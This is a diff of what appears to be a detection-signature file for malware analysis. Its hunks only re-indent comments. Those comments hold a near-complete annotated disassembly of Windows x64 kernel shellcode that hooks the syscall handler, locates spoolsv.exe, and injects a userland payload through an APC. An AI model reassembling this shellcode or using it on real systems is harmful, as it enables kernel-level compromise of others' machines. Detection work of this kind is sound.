@@ -6,9 +6,9 @@
     
         /*
             31C9                 | 1.                   | xor ecx, ecx
-        41                   | A                    | #ommited# db 0x41
-        E201                 | ..                   | loop x64_payload_start
-        C3                   | .                    | ret
+            41                   | A                    | #ommited# db 0x41
+            E201                 | ..                   | loop x64_payload_start
+            C3                   | .                    | ret
         */
     
         strings:
@@ -26,15 +26,15 @@
     
         /*
             B9820000C0           | .....                | mov ecx, 0xc0000082
-        0F32                 | .2                   | rdmsr
-        48BBF80FD0FFFFFFFFFF | H.........           | #ommited# db 0x48, 0xbb, 0xf8, 0x0f, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff
-        895304               | .S.                  | mov dword [rbx+0x4], edx
-        8903                 | ..                   | mov dword [rbx], eax
-        488D050A000000       | H......              | lea rax, [rel x64_syscall_handler]
-        4889C2               | H..                  | mov rdx, rax
-        48C1EA20             | H..                  | shr rdx, 0x20
-        0F30                 | .0                   | wrmsr
-        C3                   | .                    | ret
+            0F32                 | .2                   | rdmsr
+            48BBF80FD0FFFFFFFFFF | H.........           | #ommited# db 0x48, 0xbb, 0xf8, 0x0f, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff
+            895304               | .S.                  | mov dword [rbx+0x4], edx
+            8903                 | ..                   | mov dword [rbx], eax
+            488D050A000000       | H......              | lea rax, [rel x64_syscall_handler]
+            4889C2               | H..                  | mov rdx, rax
+            48C1EA20             | H..                  | shr rdx, 0x20
+            0F30                 | .0                   | wrmsr
+            C3                   | .                    | ret
         */
     
         strings:
@@ -52,67 +52,67 @@
     
         /*
             0F01F8               | ...                  | swapgs
-        654889242510000000   | eH.$%....            | mov qword [gs:0x10], rsp
-        65488B2425A8010000   | eH.$%....            | mov rsp, qword [gs:0x1a8]
-        50                   | P                    | push rax
-        53                   | S                    | push rbx
-        51                   | Q                    | push rcx
-        52                   | R                    | push rdx
-        56                   | V                    | push rsi
-        57                   | W                    | push rdi
-        55                   | U                    | push rbp
-        4150                 | AP                   | push r8
-        4151                 | AQ                   | push r9
-        4152                 | AR                   | push r10
-        4153                 | AS                   | push r11
-        4154                 | AT                   | push r12
-        4155                 | AU                   | push r13
-        4156                 | AV                   | push r14
-        4157                 | AW                   | push r15
-        6A2B                 | j+                   | push 0x2b
-        65FF342510000000     | e.4%....             | push qword [gs:0x10]
-        4153                 | AS                   | push r11
-        6A33                 | j3                   | push 0x33
-        51                   | Q                    | push rcx
-        4C89D1               | L..                  | mov rcx, r10
-        4883EC08             | H...                 | sub rsp, 0x8
-        55                   | U                    | push rbp
-        4881EC58010000       | H..X...              | sub rsp, 0x158
-        488DAC2480000000     | H..$....             | lea rbp, [rsp + 0x80]
-        48899DC0000000       | H......              | mov qword [rbp+0xc0],rbx
-        4889BDC8000000       | H......              | mov qword [rbp+0xc8],rdi
-        4889B5D0000000       | H......              | mov qword [rbp+0xd0],rsi
-        48A1F80FD0FFFFFFFFFF | H.........           | #ommited# db 0x48, 0xa1, 0xf8, 0x0f, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff
-        4889C2               | H..                  | mov rdx, rax
-        48C1EA20             | H..                  | shr rdx, 0x20
-        4831DB               | H1.                  | xor rbx, rbx
-        FFCB                 | ..                   | dec ebx
-        4821D8               | H!.                  | and rax, rbx
-        B9820000C0           | .....                | mov ecx, 0xc0000082
-        0F30                 | .0                   | wrmsr
-        FB                   | .                    | sti
-        E838000000           | .8...                | call x64_kernel_start
-        FA                   | .                    | cli
-        65488B2425A8010000   | eH.$%....            | mov rsp, qword [abs gs:0x1a8]
-        4883EC78             | H..x                 | sub rsp, 0x78
-        415F                 | A_                   | pop r15
-        415E                 | A^                   | pop r14
-        415D                 | A]                   | pop r13
-        415C                 | A\                   | pop r12
-        415B                 | A[                   | pop r11
-        415A                 | AZ                   | pop r10
-        4159                 | AY                   | pop r9
-        4158                 | AX                   | pop r8
-        5D                   | ]                    | pop rbp
-        5F                   | _                    | pop rdi
-        5E                   | ^                    | pop rsi
-        5A                   | Z                    | pop rdx
-        59                   | Y                    | pop rcx
-        5B                   | [                    | pop rbx
-        58                   | X                    | pop rax
-        65488B242510000000   | eH.$%....            | mov rsp, qword [abs gs:0x10]
-        0F01F8               | ...                  | swapgs
-        FF2425F80FD0FF       | .$%....              | jmp [0xffffffffffd00ff8]
+            654889242510000000   | eH.$%....            | mov qword [gs:0x10], rsp
+            65488B2425A8010000   | eH.$%....            | mov rsp, qword [gs:0x1a8]
+            50                   | P                    | push rax
+            53                   | S                    | push rbx
+            51                   | Q                    | push rcx
+            52                   | R                    | push rdx
+            56                   | V                    | push rsi
+            57                   | W                    | push rdi
+            55                   | U                    | push rbp
+            4150                 | AP                   | push r8
+            4151                 | AQ                   | push r9
+            4152                 | AR                   | push r10
+            4153                 | AS                   | push r11
+            4154                 | AT                   | push r12
+            4155                 | AU                   | push r13
+            4156                 | AV                   | push r14
+            4157                 | AW                   | push r15
+            6A2B                 | j+                   | push 0x2b
+            65FF342510000000     | e.4%....             | push qword [gs:0x10]
+            4153                 | AS                   | push r11
+            6A33                 | j3                   | push 0x33
+            51                   | Q                    | push rcx
+            4C89D1               | L..                  | mov rcx, r10
+            4883EC08             | H...                 | sub rsp, 0x8
+            55                   | U                    | push rbp
+            4881EC58010000       | H..X...              | sub rsp, 0x158
+            488DAC2480000000     | H..$....             | lea rbp, [rsp + 0x80]
+            48899DC0000000       | H......              | mov qword [rbp+0xc0],rbx
+            4889BDC8000000       | H......              | mov qword [rbp+0xc8],rdi
+            4889B5D0000000       | H......              | mov qword [rbp+0xd0],rsi
+            48A1F80FD0FFFFFFFFFF | H.........           | #ommited# db 0x48, 0xa1, 0xf8, 0x0f, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff
+            4889C2               | H..                  | mov rdx, rax
+            48C1EA20             | H..                  | shr rdx, 0x20
+            4831DB               | H1.                  | xor rbx, rbx
+            FFCB                 | ..                   | dec ebx
+            4821D8               | H!.                  | and rax, rbx
+            B9820000C0           | .....                | mov ecx, 0xc0000082
+            0F30                 | .0                   | wrmsr
+            FB                   | .                    | sti
+            E838000000           | .8...                | call x64_kernel_start
+            FA                   | .                    | cli
+            65488B2425A8010000   | eH.$%....            | mov rsp, qword [abs gs:0x1a8]
+            4883EC78             | H..x                 | sub rsp, 0x78
+            415F                 | A_                   | pop r15
+            415E                 | A^                   | pop r14
+            415D                 | A]                   | pop r13
+            415C                 | A\                   | pop r12
+            415B                 | A[                   | pop r11
+            415A                 | AZ                   | pop r10
+            4159                 | AY                   | pop r9
+            4158                 | AX                   | pop r8
+            5D                   | ]                    | pop rbp
+            5F                   | _                    | pop rdi
+            5E                   | ^                    | pop rsi
+            5A                   | Z                    | pop rdx
+            59                   | Y                    | pop rcx
+            5B                   | [                    | pop rbx
+            58                   | X                    | pop rax
+            65488B242510000000   | eH.$%....            | mov rsp, qword [abs gs:0x10]
+            0F01F8               | ...                  | swapgs
+            FF2425F80FD0FF       | .$%....              | jmp [0xffffffffffd00ff8]
         */
     
         strings:
@@ -130,16 +130,16 @@
     
         /*
             56                   | V                    | push rsi
-        4157                 | AW                   | push r15
-        4156                 | AV                   | push r14
-        4155                 | AU                   | push r13
-        4154                 | AT                   | push r12
-        53                   | S                    | push rbx
-        55                   | U                    | push rbp
-        4889E5               | H..                  | mov rbp, rsp
-        6683E4F0             | f...                 | and sp, 0xfff0
-        4883EC20             | H..                  | sub rsp, 0x20
-        4C8D35E3FFFFFF       | L.5....              | lea r14, [rel x64_kernel_start]
+            4157                 | AW                   | push r15
+            4156                 | AV                   | push r14
+            4155                 | AU                   | push r13
+            4154                 | AT                   | push r12
+            53                   | S                    | push rbx
+            55                   | U                    | push rbp
+            4889E5               | H..                  | mov rbp, rsp
+            6683E4F0             | f...                 | and sp, 0xfff0
+            4883EC20             | H..                  | sub rsp, 0x20
+            4C8D35E3FFFFFF       | L.5....              | lea r14, [rel x64_kernel_start]
         */
     
         strings:
@@ -157,9 +157,9 @@
     
         /*
             654C8B3C2538000000   | eL.<%8...            | mov r15, qword [gs:0x38]
-        4D8B7F04             | M...                 | mov r15, qword [r15 + 0x4]
-        49C1EF0C             | I...                 | shr r15, 0xc
-        49C1E70C             | I...                 | shl r15, 0xc
+            4D8B7F04             | M...                 | mov r15, qword [r15 + 0x4]
+            49C1EF0C             | I...                 | shr r15, 0xc
+            49C1E70C             | I...                 | shl r15, 0xc
         */
     
         strings:
@@ -177,9 +177,9 @@
     
         /*
             4981EF00100000       | I......              | sub r15, 0x1000
-        498B37               | I.7                  | mov rsi, qword [r15]
-        6681FE4D5A           | f..MZ                | cmp si, 0x5a4d
-        75EF                 | u.                   | jne _x64_find_nt_idt_walk_page
+            498B37               | I.7                  | mov rsi, qword [r15]
+            6681FE4D5A           | f..MZ                | cmp si, 0x5a4d
+            75EF                 | u.                   | jne _x64_find_nt_idt_walk_page
         */
     
         strings:
@@ -197,12 +197,12 @@
     
         /*
             41BB5C721162         | A.\r.b               | mov r11d, psgetcurrentprocess_hash
-        E818020000           | .....                | call x64_block_api_direct
-        4889C6               | H..                  | mov rsi, rax
-        4881C608030000       | H......              | add rsi, eprocess_threadlisthead_blink_offset
-        41BB7ABAA330         | A.z..0               | mov r11d, kegetcurrentthread_hash
-        E803020000           | .....                | call x64_block_api_direct
-        4889F1               | H..                  | mov rcx, rsi
+            E818020000           | .....                | call x64_block_api_direct
+            4889C6               | H..                  | mov rsi, rax
+            4881C608030000       | H......              | add rsi, eprocess_threadlisthead_blink_offset
+            41BB7ABAA330         | A.z..0               | mov r11d, kegetcurrentthread_hash
+            E803020000           | .....                | call x64_block_api_direct
+            4889F1               | H..                  | mov rcx, rsi
         */
     
         strings:
@@ -220,12 +220,12 @@
     
         /*
             4839F0               | H9.                  | cmp rax, rsi
-        7711                 | w.                   | ja _find_threadlistentry_offset_walk_threads
-        488D9000050000       | H......              | lea rdx, [rax + 0x500]
-        4839F2               | H9.                  | cmp rdx, rsi
-        7205                 | r.                   | jb _find_threadlistentry_offset_walk_threads
-        4829C6               | H).                  | sub rsi, rax
-        EB08                 | ..                   | jmp _find_threadlistentry_offset_calc_thread_exit
+            7711                 | w.                   | ja _find_threadlistentry_offset_walk_threads
+            488D9000050000       | H......              | lea rdx, [rax + 0x500]
+            4839F2               | H9.                  | cmp rdx, rsi
+            7205                 | r.                   | jb _find_threadlistentry_offset_walk_threads
+            4829C6               | H).                  | sub rsi, rax
+            EB08                 | ..                   | jmp _find_threadlistentry_offset_calc_thread_exit
         */
     
         strings:
@@ -243,8 +243,8 @@
     
         /*
             488B36               | H.6                  | mov rsi, qword [rsi]
-        4839CE               | H9.                  | cmp rsi, rcx
-        75E2                 | u.                   | jne _find_threadlistentry_offset_compare_threads
+            4839CE               | H9.                  | cmp rsi, rcx
+            75E2                 | u.                   | jne _find_threadlistentry_offset_compare_threads
         */
     
         strings:
@@ -262,22 +262,22 @@
     
         /*
             89D9                 | ..                   | mov ecx, ebx
-        83C104               | ...                  | add ecx, 0x4
-        81F900000100         | ......               | cmp ecx, 0x10000
-        0F8D66010000         | ..f...               | jge x64_kernel_exit
-        4C89F2               | L..                  | mov rdx, r14
-        89CB                 | ..                   | mov ebx, ecx
-        41BB6655A24B         | A.fU.K               | mov r11d, pslookupprocessbyprocessid_hash
-        E8BC010000           | .....                | call x64_block_api_direct
-        85C0                 | ..                   | test eax, eax
-        75DB                 | u.                   | jnz _x64_find_process_name_loop_pid
-        498B0E               | I..                  | mov rcx, [r14]
-        41BBA36F722D         | A..or-               | mov r11d, psgetprocessimagefilename_hash
-        E8AA010000           | .....                | call x64_block_api_direct
-        4889C6               | H..                  | mov rsi, rax
-        E850010000           | .P...                | call x64_calc_hash
-        4181F9BF771FDD       | A...w..              | cmp r9d, spoolsv_exe_hash
-        75BC                 | u.                   | jne _x64_find_process_name_loop_pid
+            83C104               | ...                  | add ecx, 0x4
+            81F900000100         | ......               | cmp ecx, 0x10000
+            0F8D66010000         | ..f...               | jge x64_kernel_exit
+            4C89F2               | L..                  | mov rdx, r14
+            89CB                 | ..                   | mov ebx, ecx
+            41BB6655A24B         | A.fU.K               | mov r11d, pslookupprocessbyprocessid_hash
+            E8BC010000           | .....                | call x64_block_api_direct
+            85C0                 | ..                   | test eax, eax
+            75DB                 | u.                   | jnz _x64_find_process_name_loop_pid
+            498B0E               | I..                  | mov rcx, [r14]
+            41BBA36F722D         | A..or-               | mov r11d, psgetprocessimagefilename_hash
+            E8AA010000           | .....                | call x64_block_api_direct
+            4889C6               | H..                  | mov rsi, rax
+            E850010000           | .P...                | call x64_calc_hash
+            4181F9BF771FDD       | A...w..              | cmp r9d, spoolsv_exe_hash
+            75BC                 | u.                   | jne _x64_find_process_name_loop_pid
         */
     
         strings:
@@ -295,25 +295,25 @@
     
         /*
             498B1E               | I..                  | mov rbx, [r14]
-        4D8D6E10             | M.n.                 | lea r13, [r14 + 16]
-        4C89EA               | L..                  | mov rdx, r13
-        4889D9               | H..                  | mov rcx, rbx
-        41BBE52411DC         | A..$..               | mov r11d, kestackattachprocess_hash
-        E881010000           | .....                | call x64_block_api_direct
-        6A40                 | j@                   | push 0x40
-        6800100000           | h....                | push 0x1000
-        4D8D4E08             | M.N.                 | lea r9, [r14 + 8]
-        49C70100100000       | I......              | mov qword [r9], 0x1000
-        4D31C0               | M1.                  | xor r8, r8
-        4C89F2               | L..                  | mov rdx, r14
-        31C9                 | 1.                   | xor ecx, ecx
-        48890A               | H..                  | mov qword [rdx], rcx
-        48F7D1               | H..                  | not rcx
-        41BB4BCA0AEE         | A.K...               | mov r11d, zwallocatevirtualmemory_hash
-        4883EC20             | H..                  | sub rsp, 0x20
-        E852010000           | .R...                | call x64_block_api_direct
-        85C0                 | ..                   | test eax, eax
-        0F85C8000000         | ......               | jnz x64_kernel_exit_cleanup
+            4D8D6E10             | M.n.                 | lea r13, [r14 + 16]
+            4C89EA               | L..                  | mov rdx, r13
+            4889D9               | H..                  | mov rcx, rbx
+            41BBE52411DC         | A..$..               | mov r11d, kestackattachprocess_hash
+            E881010000           | .....                | call x64_block_api_direct
+            6A40                 | j@                   | push 0x40
+            6800100000           | h....                | push 0x1000
+            4D8D4E08             | M.N.                 | lea r9, [r14 + 8]
+            49C70100100000       | I......              | mov qword [r9], 0x1000
+            4D31C0               | M1.                  | xor r8, r8
+            4C89F2               | L..                  | mov rdx, r14
+            31C9                 | 1.                   | xor ecx, ecx
+            48890A               | H..                  | mov qword [rdx], rcx
+            48F7D1               | H..                  | not rcx
+            41BB4BCA0AEE         | A.K...               | mov r11d, zwallocatevirtualmemory_hash
+            4883EC20             | H..                  | sub rsp, 0x20
+            E852010000           | .R...                | call x64_block_api_direct
+            85C0                 | ..                   | test eax, eax
+            0F85C8000000         | ......               | jnz x64_kernel_exit_cleanup
         */
     
         strings:
@@ -331,11 +331,11 @@
     
         /*
             498B3E               | I.>                  | mov rdi, [r14]
-        488D35E9000000       | H.5....              | lea rsi, [rel userland_start]
-        31C9                 | 1.                   | xor ecx, ecx
-        66030DD7010000       | f......              | add cx, word [rel userland_payload_size]
-        6681C1F900           | f....                | add cx, userland_payload - userland_start
-        F3A4                 | ..                   | rep movsb
+            488D35E9000000       | H.5....              | lea rsi, [rel userland_start]
+            31C9                 | 1.                   | xor ecx, ecx
+            66030DD7010000       | f......              | add cx, word [rel userland_payload_size]
+            6681C1F900           | f....                | add cx, userland_payload - userland_start
+            F3A4                 | ..                   | rep movsb
         */
     
         strings:
@@ -353,8 +353,8 @@
     
         /*
             4889DE               | H..                  | mov rsi, rbx
-        4881C608030000       | H......              | add rsi, eprocess_threadlisthead_blink_offset
-        4889F1               | H..                  | mov rcx, rsi
+            4881C608030000       | H......              | add rsi, eprocess_threadlisthead_blink_offset
+            4889F1               | H..                  | mov rcx, rsi
         */
     
         strings:
@@ -372,25 +372,25 @@
     
         /*
             488B11               | H..                  | mov rdx, [rcx]
-        4C29E2               | L).                  | sub rdx, r12
-        51                   | Q                    | push rcx
-        52                   | R                    | push rdx
-        4889D1               | H..                  | mov rcx, rdx
-        4883EC20             | H..                  | sub rsp, 0x20
-        41BB2640369D         | A.&@6.               | mov r11d, psgetthreadteb_hash
-        E809010000           | .....                | call x64_block_api_direct
-        4883C420             | H..                  | add rsp, 0x20
-        5A                   | Z                    | pop rdx
-        59                   | Y                    | pop rcx
-        4885C0               | H..                  | test rax, rax
-        7418                 | t.                   | je _x64_find_alertable_thread_skip_next
-        488B80C8020000       | H......              | mov rax, qword [rax + teb_activationcontextstackpointer_offset]
-        4885C0               | H..                  | test rax, rax
-        740C                 | t.                   | je _x64_find_alertable_thread_skip_next
-        4883C24C             | H..L                 | add rdx, ethread_alertable_offset
-        8B02                 | ..                   | mov eax, dword [rdx]
-        0FBAE005             | ....                 | bt eax, 0x5
-        7205                 | r.                   | jb _x64_find_alertable_thread_found
+            4C29E2               | L).                  | sub rdx, r12
+            51                   | Q                    | push rcx
+            52                   | R                    | push rdx
+            4889D1               | H..                  | mov rcx, rdx
+            4883EC20             | H..                  | sub rsp, 0x20
+            41BB2640369D         | A.&@6.               | mov r11d, psgetthreadteb_hash
+            E809010000           | .....                | call x64_block_api_direct
+            4883C420             | H..                  | add rsp, 0x20
+            5A                   | Z                    | pop rdx
+            59                   | Y                    | pop rcx
+            4885C0               | H..                  | test rax, rax
+            7418                 | t.                   | je _x64_find_alertable_thread_skip_next
+            488B80C8020000       | H......              | mov rax, qword [rax + teb_activationcontextstackpointer_offset]
+            4885C0               | H..                  | test rax, rax
+            740C                 | t.                   | je _x64_find_alertable_thread_skip_next
+            4883C24C             | H..L                 | add rdx, ethread_alertable_offset
+            8B02                 | ..                   | mov eax, dword [rdx]
+            0FBAE005             | ....                 | bt eax, 0x5
+            7205                 | r.                   | jb _x64_find_alertable_thread_found
         */
     
         strings:
@@ -408,7 +408,7 @@
     
         /*
             488B09               | H..                  | mov rcx, [rcx]
-        EBBE                 | ..                   | jmp _x64_find_alertable_thread_loop
+            EBBE                 | ..                   | jmp _x64_find_alertable_thread_loop
         */
     
         strings:
@@ -426,7 +426,7 @@
     
         /*
             4883EA4C             | H..L                 | sub rdx, ethread_alertable_offset
-        4989D4               | I..                  | mov r12, rdx
+            4989D4               | I..                  | mov r12, rdx
         */
     
         strings:
@@ -444,32 +444,32 @@
     
         /*
             31D2                 | 1.                   | xor edx, edx
-        80C290               | ...                  | add dl, 0x90
-        31C9                 | 1.                   | xor ecx, ecx
-        41BB26AC5091         | A.&.P.               | mov r11d, exallocatepool_hash
-        E8C8000000           | .....                | call x64_block_api_direct
-        4889C1               | H..                  | mov rcx, rax
-        4C8D8980000000       | L......              | lea r9, [rcx + 0x80]
-        41C601C3             | A...                 | mov byte [r9], 0xc3
-        4C89E2               | L..                  | mov rdx, r12
-        4989C4               | I..                  | mov r12, rax
-        4D31C0               | M1.                  | xor r8, r8
-        4150                 | AP                   | push r8
-        6A01                 | j.                   | push 0x1
-        498B06               | I..                  | mov rax, [r14]
-        50                   | P                    | push rax
-        4150                 | AP                   | push r8
-        4883EC20             | H..                  | sub rsp, 0x20
-        41BBACCE554B         | A...UK               | mov r11d, keinitializeapc_hash
-        E898000000           | .....                | call x64_block_api_direct
-        31D2                 | 1.                   | xor edx, edx
-        52                   | R                    | push rdx
-        52                   | R                    | push rdx
-        4158                 | AX                   | pop r8
-        4159                 | AY                   | pop r9
-        4C89E1               | L..                  | mov rcx, r12
-        41BB1838099E         | A..8..               | mov r11d, keinsertqueueapc_hash
-        E882000000           | .....                | call x64_block_api_direct
+            80C290               | ...                  | add dl, 0x90
+            31C9                 | 1.                   | xor ecx, ecx
+            41BB26AC5091         | A.&.P.               | mov r11d, exallocatepool_hash
+            E8C8000000           | .....                | call x64_block_api_direct
+            4889C1               | H..                  | mov rcx, rax
+            4C8D8980000000       | L......              | lea r9, [rcx + 0x80]
+            41C601C3             | A...                 | mov byte [r9], 0xc3
+            4C89E2               | L..                  | mov rdx, r12
+            4989C4               | I..                  | mov r12, rax
+            4D31C0               | M1.                  | xor r8, r8
+            4150                 | AP                   | push r8
+            6A01                 | j.                   | push 0x1
+            498B06               | I..                  | mov rax, [r14]
+            50                   | P                    | push rax
+            4150                 | AP                   | push r8
+            4883EC20             | H..                  | sub rsp, 0x20
+            41BBACCE554B         | A...UK               | mov r11d, keinitializeapc_hash
+            E898000000           | .....                | call x64_block_api_direct
+            31D2                 | 1.                   | xor edx, edx
+            52                   | R                    | push rdx
+            52                   | R                    | push rdx
+            4158                 | AX                   | pop r8
+            4159                 | AY                   | pop r9
+            4C89E1               | L..                  | mov rcx, r12
+            41BB1838099E         | A..8..               | mov r11d, keinsertqueueapc_hash
+            E882000000           | .....                | call x64_block_api_direct
         */
     
         strings:
@@ -487,11 +487,11 @@
     
         /*
             4C89E9               | L..                  | mov rcx, r13
-        41BB22B7B37D         | A."..}               | mov r11d, keunstackdetachprocess_hash
-        E874000000           | .t...                | call x64_block_api_direct
-        4889D9               | H..                  | mov rcx, rbx
-        41BB0DE24D85         | A...M.               | mov r11d, obdereferenceobject_hash
-        E866000000           | .f...                | call x64_block_api_direct
+            41BB22B7B37D         | A."..}               | mov r11d, keunstackdetachprocess_hash
+            E874000000           | .t...                | call x64_block_api_direct
+            4889D9               | H..                  | mov rcx, rbx
+            41BB0DE24D85         | A...M.               | mov r11d, obdereferenceobject_hash
+            E866000000           | .f...                | call x64_block_api_direct
         */
     
         strings:
@@ -509,14 +509,14 @@
     
         /*
             4889EC               | H..                  | mov rsp, rbp
-        5D                   | ]                    | pop rbp
-        5B                   | [                    | pop rbx
-        415C                 | A\                   | pop r12
-        415D                 | A]                   | pop r13
-        415E                 | A^                   | pop r14
-        415F                 | A_                   | pop r15
-        5E                   | ^                    | pop rsi
-        C3                   | .                    | ret
+            5D                   | ]                    | pop rbp
+            5B                   | [                    | pop rbx
+            415C                 | A\                   | pop r12
+            415D                 | A]                   | pop r13
+            415E                 | A^                   | pop r14
+            415F                 | A_                   | pop r15
+            5E                   | ^                    | pop rsi
+            C3                   | .                    | ret
         */
     
         strings:
@@ -534,11 +534,11 @@
     
         /*
             31C0                 | 1.                   | xor eax, eax
-        AC                   | .                    | lodsb
-        41C1C90D             | A...                 | ror r9d, 13
-        3C61                 | <a                   | cmp al, 'a'
-        7C02                 | |.                   | jl _x64_calc_hash_not_lowercase
-        2C20                 | ,                    | sub al, 0x20
+            AC                   | .                    | lodsb
+            41C1C90D             | A...                 | ror r9d, 13
+            3C61                 | <a                   | cmp al, 'a'
+            7C02                 | |.                   | jl _x64_calc_hash_not_lowercase
+            2C20                 | ,                    | sub al, 0x20
         */
     
         strings:
@@ -556,9 +556,9 @@
     
         /*
             4101C1               | A..                  | add r9d, eax
-        38E0                 | 8.                   | cmp al, ah
-        75EC                 | u.                   | jne _x64_calc_hash_loop
-        C3                   | .                    | ret
+            38E0                 | 8.                   | cmp al, ah
+            75EC                 | u.                   | jne _x64_calc_hash_loop
+            C3                   | .                    | ret
         */
     
         strings:
@@ -576,9 +576,9 @@
     
         /*
             31D2                 | 1.                   | xor edx, edx
-        65488B5260           | eH.R`                | mov rdx, [gs:rdx + 96]
-        488B5218             | H.R.                 | mov rdx, [rdx + 24]
-        488B5220             | H.R                  | mov rdx, [rdx + 32]
+            65488B5260           | eH.R`                | mov rdx, [gs:rdx + 96]
+            488B5218             | H.R.                 | mov rdx, [rdx + 24]
+            488B5220             | H.R                  | mov rdx, [rdx + 32]
         */
     
         strings:
@@ -596,9 +596,9 @@
     
         /*
             488B12               | H..                  | mov rdx, [rdx]
-        488B7250             | H.rP                 | mov rsi, [rdx + 80]
-        480FB74A4A           | H..JJ                | movzx rcx, word [rdx + 74]
-        4531C9               | E1.                  | xor r9d, r9d
+            488B7250             | H.rP                 | mov rsi, [rdx + 80]
+            480FB74A4A           | H..JJ                | movzx rcx, word [rdx + 74]
+            4531C9               | E1.                  | xor r9d, r9d
         */
     
         strings:
@@ -616,10 +616,10 @@
     
         /*
             31C0                 | 1.                   | xor eax, eax
-        AC                   | .                    | lodsb
-        3C61                 | <a                   | cmp al, 'a'
-        7C02                 | |.                   | jl _x64_block_find_dll_not_lowercase
-        2C20                 | ,                    | sub al, 0x20
+            AC                   | .                    | lodsb
+            3C61                 | <a                   | cmp al, 'a'
+            7C02                 | |.                   | jl _x64_block_find_dll_not_lowercase
+            2C20                 | ,                    | sub al, 0x20
         */
     
         strings:
@@ -637,12 +637,12 @@
     
         /*
             41C1C90D             | A...                 | ror r9d, 13
-        4101C1               | A..                  | add r9d, eax
-        E2EE                 | ..                   | loop _x64_block_find_dll_loop_mod_name
-        4539D9               | E9.                  | cmp r9d, r11d
-        75DA                 | u.                   | jnz _x64_block_find_dll_next_mod
-        4C8B7A20             | L.z                  | mov r15, [rdx + 32]
-        C3                   | .                    | ret
+            4101C1               | A..                  | add r9d, eax
+            E2EE                 | ..                   | loop _x64_block_find_dll_loop_mod_name
+            4539D9               | E9.                  | cmp r9d, r11d
+            75DA                 | u.                   | jnz _x64_block_find_dll_next_mod
+            4C8B7A20             | L.z                  | mov r15, [rdx + 32]
+            C3                   | .                    | ret
         */
     
         strings:
@@ -660,20 +660,20 @@
     
         /*
             4C89F8               | L..                  | mov rax, r15
-        4151                 | AQ                   | push r9
-        4150                 | AP                   | push r8
-        52                   | R                    | push rdx
-        51                   | Q                    | push rcx
-        56                   | V                    | push rsi
-        4889C2               | H..                  | mov rdx, rax
-        8B423C               | .B<                  | mov eax, dword [rdx+60]
-        4801D0               | H..                  | add rax, rdx
-        8B8088000000         | ......               | mov eax, dword [rax+136]
-        4801D0               | H..                  | add rax, rdx
-        50                   | P                    | push rax
-        8B4818               | .H.                  | mov ecx, dword [rax+24]
-        448B4020             | D.@                  | mov r8d, dword [rax+32]
-        4901D0               | I..                  | add r8, rdx
+            4151                 | AQ                   | push r9
+            4150                 | AP                   | push r8
+            52                   | R                    | push rdx
+            51                   | Q                    | push rcx
+            56                   | V                    | push rsi
+            4889C2               | H..                  | mov rdx, rax
+            8B423C               | .B<                  | mov eax, dword [rdx+60]
+            4801D0               | H..                  | add rax, rdx
+            8B8088000000         | ......               | mov eax, dword [rax+136]
+            4801D0               | H..                  | add rax, rdx
+            50                   | P                    | push rax
+            8B4818               | .H.                  | mov ecx, dword [rax+24]
+            448B4020             | D.@                  | mov r8d, dword [rax+32]
+            4901D0               | I..                  | add r8, rdx
         */
     
         strings:
@@ -691,11 +691,11 @@
     
         /*
             48FFC9               | H..                  | dec rcx
-        418B3488             | A.4.                 | mov esi, dword [r8+rcx*4]
-        4801D6               | H..                  | add rsi, rdx
-        E878FFFFFF           | .x...                | call x64_calc_hash
-        4539D9               | E9.                  | cmp r9d, r11d
-        75EC                 | u.                   | jnz _x64_block_api_direct_get_next_func
+            418B3488             | A.4.                 | mov esi, dword [r8+rcx*4]
+            4801D6               | H..                  | add rsi, rdx
+            E878FFFFFF           | .x...                | call x64_calc_hash
+            4539D9               | E9.                  | cmp r9d, r11d
+            75EC                 | u.                   | jnz _x64_block_api_direct_get_next_func
         */
     
         strings:
@@ -713,21 +713,21 @@
     
         /*
             58                   | X                    | pop rax
-        448B4024             | D.@$                 | mov r8d, dword [rax+36]
-        4901D0               | I..                  | add r8, rdx
-        66418B0C48           | fA..H                | mov cx, [r8+2*rcx]
-        448B401C             | D.@.                 | mov r8d, dword [rax+28]
-        4901D0               | I..                  | add r8, rdx
-        418B0488             | A...                 | mov eax, dword [r8+4*rcx]
-        4801D0               | H..                  | add rax, rdx
-        5E                   | ^                    | pop rsi
-        59                   | Y                    | pop rcx
-        5A                   | Z                    | pop rdx
-        4158                 | AX                   | pop r8
-        4159                 | AY                   | pop r9
-        415B                 | A[                   | pop r11
-        4153                 | AS                   | push r11
-        FFE0                 | ..                   | jmp rax
+            448B4024             | D.@$                 | mov r8d, dword [rax+36]
+            4901D0               | I..                  | add r8, rdx
+            66418B0C48           | fA..H                | mov cx, [r8+2*rcx]
+            448B401C             | D.@.                 | mov r8d, dword [rax+28]
+            4901D0               | I..                  | add r8, rdx
+            418B0488             | A...                 | mov eax, dword [r8+4*rcx]
+            4801D0               | H..                  | add rax, rdx
+            5E                   | ^                    | pop rsi
+            59                   | Y                    | pop rcx
+            5A                   | Z                    | pop rdx
+            4158                 | AX                   | pop r8
+            4159                 | AY                   | pop r9
+            415B                 | A[                   | pop r11
+            4153                 | AS                   | push r11
+            FFE0                 | ..                   | jmp rax
         */
     
         strings:
@@ -745,28 +745,28 @@
     
         /*
             56                   | V                    | push rsi
-        4157                 | AW                   | push r15
-        55                   | U                    | push rbp
-        4889E5               | H..                  | mov rbp, rsp
-        4883EC20             | H..                  | sub rsp, 0x20
-        41BBDA16AF92         | A.....               | mov r11d, kernel32_dll_hash
-        E84DFFFFFF           | .M...                | call x64_block_find_dll
-        31C9                 | 1.                   | xor ecx, ecx
-        51                   | Q                    | push rcx
-        51                   | Q                    | push rcx
-        51                   | Q                    | push rcx
-        51                   | Q                    | push rcx
-        4159                 | AY                   | pop r9
-        4C8D051A000000       | L......              | lea r8, [rel userland_payload]
-        5A                   | Z                    | pop rdx
-        4883EC20             | H..                  | sub rsp, 0x20
-        41BB46451B22         | A.FE."               | mov r11d, createthread_hash
-        E868FFFFFF           | .h...                | call x64_block_api_direct
-        4889EC               | H..                  | mov rsp, rbp
-        5D                   | ]                    | pop rbp
-        415F                 | A_                   | pop r15
-        5E                   | ^                    | pop rsi
-        C3                   | .                    | ret
+            4157                 | AW                   | push r15
+            55                   | U                    | push rbp
+            4889E5               | H..                  | mov rbp, rsp
+            4883EC20             | H..                  | sub rsp, 0x20
+            41BBDA16AF92         | A.....               | mov r11d, kernel32_dll_hash
+            E84DFFFFFF           | .M...                | call x64_block_find_dll
